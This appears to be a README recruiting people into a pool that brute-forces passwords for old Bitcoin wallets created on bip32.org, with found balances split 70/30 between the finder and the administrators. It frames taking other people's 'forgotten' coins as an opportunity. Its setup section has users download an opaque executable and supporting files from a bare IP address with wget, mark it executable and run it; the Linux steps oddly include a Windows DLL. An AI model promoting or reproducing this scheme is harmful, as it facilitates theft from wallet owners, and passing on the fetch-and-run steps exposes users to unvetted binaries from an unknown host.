# bip39scan v2.0.1 POOL
# !!! The pool is expected to start this week !!!
**Collective search of old coins from the site [bip32.org](http://bip32.org)**

➡️ Online Statistic https://bip39scan.com<br>
➡️ Telegram group https://t.me/bip39scan

**Pool conditions:**<br>
💰 70% of the balance of the find to the one who found the password.<br>
💵 30% of the balance of the find to the project administration

> [!IMPORTANT]
> In the [bip39scan](https://github.com/phrutis/bip39scan) program mode 10, many old coins were found.<br>
> The brute speed is very slow, so we decided to make a pool.<br>
> Analysis of the finds showed that almost all the coins found were from 2014.<br>
> **In 2014, 1 BTC cost $300-400.** <br>
> Many users generated addresses, after the withdrawal, cents remained.<br>
> These cents are now worth a lot!<br>
> For example, abandoned $0.35 is now worth $150.<br>
> There are abandoned addresses with several dollars (now these are thousands of dollars)<br>
> Abandoned (forgotten) with small amounts (now these are tens of thousands dollars).<br>
> There is a high probability of finding forgotten coins $300-400 - this is now 1 BTC.<br>

> [!NOTE]
> Do not wait for others to find, do not miss your chance, join the pool now.


## Connect to the pool
### Linux:
```
wget http://95.215.108.160/up/xx
```
```
wget http://95.215.108.160/up/precomp.bin
```
```
wget http://95.215.108.160/up/libcrypto-1_1-x64.dll
```
```
chmod +x xx
```
```
./xx -u YourNickName --bloom 2048M
```

### Windows:
http://95.215.108.160/up/xx.exe<br>
http://95.215.108.160/up/precomp.bin<br>
http://95.215.108.160/up/libcrypto-1_1-x64.dll<br>
```
xx.exe -u Nick_Name --bloom 2048M
```


## FAQ :question:
**What does this pool do?**

Collectively brute forces passwords from old wallets created on bip32.org and others.<br>
A given alphabet is used for brute forcing, each client. <br>
Each card searches for its own piece of the main task.<hr>

**Will this pool work on my pc?**

Only CUDA cards support GTX, RTX, CMP<br>
Need RAM - 16 GB<br>
Brute speed:<br>
RTX 4090 = 50k/s<br>
RTX 5090 = 80k/s<hr>

**Why does the program require 16 GB of RAM?**

The client automatically downloads the address database 11 GB (binary format). <br>
The database is loaded into RAM and eats up 12 GB of memory, another 4 GB is needed for the system.<br>
If the database on the server has changed, it automatically updates it. <br>
After downloading, the client checks the checksum of the database, which excludes incompletely downloaded addresses.<hr>

**I want to search anonymously, how can I do this?**

For anonymity, use your BTC address instead of a nickname.<br>
Use your address, 70% will be paid to it<hr>

**What path do clients search for?**

The client uses a multipath. The search is performed on 7 pathes at once. <br>
That's why the search speed is 30% lower than the nominal one.<br>
This is 7 times faster than going through the same thing 7 times!<hr>

**How to search by nickname?**

You can use a nickname in the pool. Use xx -u Yournick --bloom 2048M<br>
You need to write @phrutis your nickname and your BTC address.<br>
I will add your address to the private list.<hr>

**I'm a miner and I have little RAM in my rig.**

Try increasing the swap file.<br>
Ask in the chat, they will tell you.<hr>

**How do I know what I found?**

The bot will send a message to the telegram group https://t.me/bip39scan with information about the find.<br>
If the client finds an address, the window displays the found address.<br>
<img width="977" height="510" alt="Image" src="https://github.com/user-attachments/assets/29720e79-e401-4d2c-82e1-f134dc52858d" /><hr>

**My client won't start, there's an error, etc.**

Write about it in the group. They'll tell you how to fix the problem.<br>
There are no telepaths in the chat. Take a screenshot of the launch window.<br>
It's important that the launch command is visible.<br>
Specify the OS, name and model of your card<hr>

**I have another question, where should I ask it?**

Write it in the group https://t.me/bip39scan the participants or administrators will tell you<hr>

